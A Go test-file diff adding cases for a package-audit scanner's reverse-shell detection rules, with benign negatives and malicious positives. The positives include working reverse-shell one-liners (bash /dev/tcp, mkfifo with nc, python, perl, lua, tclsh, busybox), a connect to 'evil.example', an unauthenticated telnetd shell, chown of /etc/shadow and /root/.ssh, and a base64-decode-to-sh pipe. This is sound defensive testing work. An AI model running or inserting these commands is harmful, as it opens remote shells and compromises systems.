@@ -158,3 +158,48 @@ func TestAuditReconCronClipboardNeedTheCommand(t *testing.T) {
 	}
 	checkRuleCases(t, neg, pos)
 }
+
+// Reverse-shell rules fired on detector tables, loopback probes, IPC pipes and spans that ran
+// across lines or whole minified bundles.
+func TestAuditReverseShellsNeedTheShape(t *testing.T) {
+	neg := []ruleCase{
+		{"P-REVSHELL-DEVTCP", "go", `if strings.Contains(cmdLower, "/dev/tcp/") && strings.Contains(cmdLower, "bash") {`},
+		{"P-REVSHELL-DEVTCP", "go", `exec 3<>/dev/tcp/127.0.0.1/0 2>/dev/null || true`},
+		{"P-REVSHELL-DEVTCP", "npm", "(0, child_process_1.execSync)(`bash -c 'exec 3<>/dev/tcp/127.0.0.1/${localPort}'`, { stdio: 'ignore' });"},
+		{"P-DEV-UDP", "go", "cmd := fmt.Sprintf(`bash -c 'echo -n \"%s:%f|%s\" > /dev/udp/127.0.0.1/8125'`, name, value, metricType)"},
+		{"P-DEV-UDP", "pypi", `NETWORK_EXFIL = ["/dev/tcp/", "/dev/udp/", "nc -e", "ncat -e", "netcat -e"]`},
+		{"P-MKFIFO", "go", `t.Skipf("mkfifo unsupported here: %v", err)`},
+		{"P-MKFIFO", "pypi", `'  mkfifo "$stdout_pipe" "$stderr_pipe"',`},
+		{"P-MKFIFO", "cargo", "let p = make();\nmkfifo\nnc_handle()"},
+		{"P-REVSHELL-PYTHON", "pypi", `if event in ('socket.connect', 'socket.getaddrinfo', 'socket.bind', 'subprocess.Popen', 'os.system'):`},
+		{"P-REVSHELL-LUA", "npm", `Callback function evaluated when new websocket connection was established.`},
+		{"G-REVSHELL-TCLSH", "npm", `If you wish to use a raw socket instead, pass the fd.`},
+		{"G-CODE-TUNNEL", "go", `return nil, errors.Wrap(err, "Couldn't decode tunnel secret from base64")`},
+		{"G-BUSYBOX-SHELL", "cargo", `exec: "/bin/busybox sh -c 'echo tatara'".into(),`},
+		{"G-BUSYBOX-SHELL", "go", `StopSignal:     "SIGKILL", // busybox sh ignores SIGTERM in this loop; force fast stop`},
+		{"G-CHOWN-SENSITIVE", "go", `chown ec2-user /home/ec2-user/.ssh/authorized_keys`},
+		{"G-CHOWN-SENSITIVE", "pypi", `"  sudo chown root:root /etc/passwd /etc/group && sudo chmod 644 /etc/passwd /etc/group\n"`},
+		{"G-BASENC-DECODE", "npm", "basenc --base64url input.txt\nopts=(-d)"},
+	}
+	pos := []ruleCase{
+		{"P-REVSHELL-DEVTCP", "npm", `cmd = exec.Command("sh", "-c", fmt.Sprintf("bash -i >& /dev/tcp/%s/%s 0>&1", ip, port))`},
+		{"P-REVSHELL-DEVTCP", "npm", "return fmt.Sprintf(`bash -c \"exec 3<>/dev/tcp/HOSTHERE/PORT_HERE; echo RAW>&3; cat <&3\"`)"},
+		{"P-REVSHELL-DEVTCP", "npm", `"echo IXF|0|{h}| >> /dev/tcp/{h}/{p} 2>/dev/null || "`},
+		{"P-DEV-UDP", "npm", `fmt.Sprintf("sh -i >& /dev/udp/%s/%s 0>&1", host, port),`},
+		{"P-MKFIFO", "npm", `"sh-fifo": f"rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",`},
+		{"P-MKFIFO", "npm", `"rm /tmp/.f; mkfifo /tmp/.f; "`},
+		{"P-REVSHELL-PYTHON", "npm", `"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"LHOST\",LPORT));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"`},
+		{"P-REVSHELL-PERL", "npm", `perl -e 'use Socket;$i="10.0.0.1";$p=4242;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){exec("/bin/sh -i");};'`},
+		{"P-REVSHELL-LUA", "npm", `lua -e "require('socket');t=socket.tcp();t:connect('10.0.0.1','4242');os.execute('/bin/sh -i <&3 >&3 2>&3');"`},
+		{"G-REVSHELL-TCLSH", "npm", `echo 'set s [socket 10.0.0.1 4444];while 1 {puts -nonewline $s "> ";flush $s;gets $s c;set e "exec $c";if {![catch {set r [eval $e]} err]} {puts $s $r};flush $s};close $s;' | tclsh`},
+		{"G-REVSHELL-NODE", "npm", `require('net').connect(1337, 'evil.example')`},
+		{"G-VIM-SHELL", "npm", `("vi/vim escape",        "vi -c ':!/bin/sh'"),`},
+		{"G-CODE-TUNNEL", "npm", `code tunnel --accept-server-license-terms --name x`},
+		{"G-BUSYBOX-SHELL", "npm", `"busybox": f"busybox nc {lhost} {lport} -e /bin/sh",`},
+		{"G-BUSYBOX-SHELL", "npm", `"BusyBox telnetd: busybox telnetd -l /bin/sh -p 23 -- opens unauth telnet",`},
+		{"G-CHOWN-SENSITIVE", "npm", `chown nobody /etc/shadow`},
+		{"G-CHOWN-SENSITIVE", "npm", `chown -R attacker:attacker /root/.ssh/`},
+		{"G-BASENC-DECODE", "npm", `echo $P | basenc --base64url -d | sh`},
+	}
+	checkRuleCases(t, neg, pos)
+}
